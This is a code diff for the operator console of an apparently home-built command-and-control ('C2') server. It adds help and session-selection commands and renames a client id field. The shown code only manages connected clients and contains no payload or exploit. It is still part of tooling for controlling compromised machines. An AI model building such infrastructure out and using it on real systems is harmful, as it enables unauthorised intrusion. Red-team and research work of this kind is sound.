@@ -9,13 +9,22 @@
 #include "ipc.h"
 #include "util.h"
 
+static const char *HELP_TEXT = "Commands:"
+                                ""
+                                "help - Display this text"
+                                "exit - Exit the C2"
+                                "list - List connected C2 clients"
+                                "ping handler_id - Ping the internal client's handler for debugging"
+                                "session handler_id - Set the provided handler as the current handler for other commands"
+                                "";
+
 int str_eq(char* part, const char* literal) {
     size_t len = strlen(literal);
 
     return strncmp(part, literal, len) == 0;
 }
 
-void parse_and_call(struct message_queues* i_map, char* input, struct ll_node* conn_root) {
+void parse_and_call(struct message_queues* i_map, char* input, struct ll_node* conn_root, struct client_info **selected_session) {
     char* saveptr;
     char* tok = strtok_r(input, " \n", &saveptr);
 
@@ -27,7 +36,9 @@ void parse_and_call(struct message_queues* i_map, char* input, struct ll_node* c
         return;
     }
 
-    if (str_eq(tok, "exit")) {
+    if (str_eq(tok, "help")) {
+        printf("%s", HELP_TEXT);
+    } else if (str_eq(tok, "exit")) {
         if (kill(getppid(), SIGTERM) != 0) {
             // TODO: In parent, handle SIGTERM and actually close socket
             kill(getppid(), SIGKILL);
@@ -50,7 +61,7 @@ void parse_and_call(struct message_queues* i_map, char* input, struct ll_node* c
         while (next_node->data != NULL) {
             struct client_info* client_info = (struct client_info*) next_node->data;
         
-            printf("Client %ld\n", client_info->id);
+            printf("Client %ld\n", client_info->ipc_id);
 
             next_node = next_node->forward;
         }
@@ -84,7 +95,7 @@ void parse_and_call(struct message_queues* i_map, char* input, struct ll_node* c
         while (next_node->data != NULL) {
             struct client_info* client_info = (struct client_info*) next_node->data;
         
-            if (client_info->id == ul) {
+            if (client_info->ipc_id == ul) {
                 found_client = true;
                 break;
             }
@@ -111,12 +122,67 @@ void parse_and_call(struct message_queues* i_map, char* input, struct ll_node* c
         ipc_send_message_down_blocking(i_map, &message);
 
         printf("Ping sent to client %ld\n", ul);
+    } else if (str_eq(tok, "session")) { 
+        // Get second argument
+        tok = strtok_r(NULL, " \n", &saveptr); // TODO: Deduplicate this code
+
+        if (tok == NULL) {
+            printf("Missing parameter <clientid:ulong>\n");
+            return;
+        }
+
+        uint64_t ul = strtoul(tok, NULL, 10);
+
+        if (ul == 0 || ul == ULONG_MAX) {
+            printf("Invalid parameter. Expected unsigned long\n");
+            return;
+        }
+
+        // Check if client exists.
+
+        struct ll_node* next_node = conn_root->forward;
+
+        if (next_node == NULL) {
+            printf("Something broke! next_node is NULL");
+            exit(1);
+        }
+
+        bool found_client = false;
+        struct client_info* client_info = NULL;
+
+        while (next_node->data != NULL) {
+            client_info = (struct client_info*) next_node->data;
+        
+            if (client_info->ipc_id == ul) {
+                found_client = true;
+                break;
+            }
+
+            next_node = next_node->forward;
+        }
+
+        if (!found_client) {
+            printf("Could not find client %ld\n", ul);
+            return;
+        }
+
+        if (client_info == NULL) {
+            printf("Something broke! client_info is NULL\n");
+            exit(1);
+        }
+
+        *selected_session = client_info;
+
+        printf("Selected client %ld\n", ul);
     } else {
         printf("Unknown command\n");
     }
 }
 
 void start_cli(struct message_queues* i_map) {
+
+    struct client_info *selected_session = NULL;
+
     // Store a linked list of connections
     // Root is defined as the node with NULL data
     struct ll_node* root = malloc(sizeof (struct ll_node));
@@ -128,11 +194,16 @@ void start_cli(struct message_queues* i_map) {
 
     struct message message_temp[QUEUE_SIZE];
 
-    char* curr_sess = "";
     char input[100];
 
     while (1) {
-        printf("%s>> ", curr_sess);
+
+        if (selected_session != NULL) {
+            printf("%ld >> ", selected_session->ipc_id);
+        } else {
+            printf(">> ");
+        }
+
         if (fgets(input, 100, stdin) == NULL) {
             printf("Error reading input.\n");
             continue;
@@ -181,7 +252,7 @@ void start_cli(struct message_queues* i_map) {
                     head = new_node;
 
                     struct client_info *info = malloc(sizeof (struct client_info));
-                    info->id = client_id;
+                    info->ipc_id = client_id;
 
                     head->data = info;
 
@@ -201,7 +272,7 @@ void start_cli(struct message_queues* i_map) {
                     while (next_node->data != NULL) {
                         struct client_info* client_info = (struct client_info*) next_node->data;
                     
-                        if (client_info->id == client_id) {
+                        if (client_info->ipc_id == client_id) {
                             found_client = true;
                             // Unlink list
                             if (next_node == head) {
@@ -209,6 +280,11 @@ void start_cli(struct message_queues* i_map) {
                             }
                             next_node->backward->forward = next_node->forward;
                             next_node->forward->backward = next_node->backward;
+
+                            if (selected_session == client_info) {
+                                selected_session = NULL;
+                            }
+
                             free(client_info);
                             free(next_node);
                             break;
@@ -230,6 +306,6 @@ void start_cli(struct message_queues* i_map) {
 
 
         // Parse input
-        parse_and_call(i_map, input, root);
+        parse_and_call(i_map, input, root, &selected_session);
     }
 }
